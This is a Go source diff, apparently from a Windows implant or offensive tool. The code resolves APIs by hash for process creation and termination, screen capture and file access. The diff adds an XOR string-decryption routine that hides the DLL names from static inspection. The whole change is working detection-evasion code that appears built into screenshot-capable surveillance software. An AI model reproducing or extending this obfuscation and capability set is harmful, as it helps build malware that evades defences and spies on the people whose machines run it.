@@ -18,31 +18,34 @@ type RGBQUAD struct {
 }
 
 var (
-	kernel32                   = syscall.NewLazyDLL("kernel32.dll")
-	procCreateProcessW         = GetFunctionAddressbyHash("kernel32", 0xfbaf90cf)
-	procWaitForSingleObject    = GetFunctionAddressbyHash("kernel32", 0xdf1b3da)
-	procTerminateProcess 	   = GetFunctionAddressbyHash("kernel32", 0xf3c179ad)
-	procOpenProcess 		   = GetFunctionAddressbyHash("kernel32", 0x8b21e0b6)
-	procGetSystemMetrics 	   = GetFunctionAddressbyHash("User32", 0x287c6401)
-	procGetDC 				   = GetFunctionAddressbyHash("User32", 0xd2b106c)
-	procCreateCompatibleDC     = GetFunctionAddressbyHash("Gdi32", 0xd0b24920)
-	procCreateCompatibleBitmap = GetFunctionAddressbyHash("Gdi32", 0xe37af6)
-	procSelectObject 		   = GetFunctionAddressbyHash("Gdi32", 0x96a6b43c)
-	procBitBlt 				   = GetFunctionAddressbyHash("Gdi32", 0xa72badc6)
-	procDeleteDC 			   = GetFunctionAddressbyHash("Gdi32", 0xb2fa1ebf)
-	procReleaseDC 			   = GetFunctionAddressbyHash("User32", 0x6fbc050d)
-	procDeleteObject 		   = GetFunctionAddressbyHash("Gdi32", 0xe619cf2f)
-	procSetProcessDPIAware	   = GetFunctionAddressbyHash("User32", 0xf96c94bd)
-	procGetDIBits 			   = GetFunctionAddressbyHash("Gdi32", 0xd4676c24)
+	str1 = DecryptString(". 7+ )vw")
+	str2 = "U"+DecryptString("6 7vw")
+	str3 = "G"+DecryptString("!,vw")
+	kernel32                   = syscall.NewLazyDLL(str1+".dll")
+	procCreateProcessW         = GetFunctionAddressbyHash(str1, 0xfbaf90cf)
+	procWaitForSingleObject    = GetFunctionAddressbyHash(str1, 0xdf1b3da)
+	procTerminateProcess 	   = GetFunctionAddressbyHash(str1, 0xf3c179ad)
+	procOpenProcess 		   = GetFunctionAddressbyHash(str1, 0x8b21e0b6)
+	procGetSystemMetrics 	   = GetFunctionAddressbyHash(str2, 0x287c6401)
+	procGetDC 				   = GetFunctionAddressbyHash(str2, 0xd2b106c)
+	procCreateCompatibleDC     = GetFunctionAddressbyHash(str3, 0xd0b24920)
+	procCreateCompatibleBitmap = GetFunctionAddressbyHash(str3, 0xe37af6)
+	procSelectObject 		   = GetFunctionAddressbyHash(str3, 0x96a6b43c)
+	procBitBlt 				   = GetFunctionAddressbyHash(str3, 0xa72badc6)
+	procDeleteDC 			   = GetFunctionAddressbyHash(str3, 0xb2fa1ebf)
+	procReleaseDC 			   = GetFunctionAddressbyHash(str2, 0x6fbc050d)
+	procDeleteObject 		   = GetFunctionAddressbyHash(str3, 0xe619cf2f)
+	procSetProcessDPIAware	   = GetFunctionAddressbyHash(str2, 0xf96c94bd)
+	procGetDIBits 			   = GetFunctionAddressbyHash(str3, 0xd4676c24)
 	loadLibraryA               = kernel32.NewProc("LoadLibraryA")
-	procCreateFileW 		   = GetFunctionAddressbyHash("kernel32", 0x687d2110)
-	procWriteFile 			   = GetFunctionAddressbyHash("kernel32", 0xf1d207d0)
-	procReadFile 			   = GetFunctionAddressbyHash("kernel32", 0x84d15061)
-	procGetFileSize 		   = GetFunctionAddressbyHash("kernel32", 0x7b813820)
-	procGlobalAlloc			   = GetFunctionAddressbyHash("kernel32", 0x38379421)
-	procGlobalFree			   = GetFunctionAddressbyHash("kernel32", 0x47886698)
-	procGlobalLock			   = GetFunctionAddressbyHash("kernel32", 0x478ba3df)
-	procGlobalUnlock		   = GetFunctionAddressbyHash("kernel32", 0x6df57622)
+	procCreateFileW 		   = GetFunctionAddressbyHash(str1, 0x687d2110)
+	procWriteFile 			   = GetFunctionAddressbyHash(str1, 0xf1d207d0)
+	procReadFile 			   = GetFunctionAddressbyHash(str1, 0x84d15061)
+	procGetFileSize 		   = GetFunctionAddressbyHash(str1, 0x7b813820)
+	procGlobalAlloc			   = GetFunctionAddressbyHash(str1, 0x38379421)
+	procGlobalFree			   = GetFunctionAddressbyHash(str1, 0x47886698)
+	procGlobalLock			   = GetFunctionAddressbyHash(str1, 0x478ba3df)
+	procGlobalUnlock		   = GetFunctionAddressbyHash(str1, 0x6df57622)
 )
 
 const (
@@ -390,4 +393,13 @@ func GlobalUnlock (hmem syscall.Handle) (bool, error) {
 		return false, syscall.EINVAL
 	}
 	return true, nil
+}
+
+func DecryptString(s string) string {
+	key := byte(0x45)
+	decoded := make([]byte, len(s))
+	for i := range s {
+		decoded[i] = s[i] ^ key
+	}
+	return string(decoded)
 }
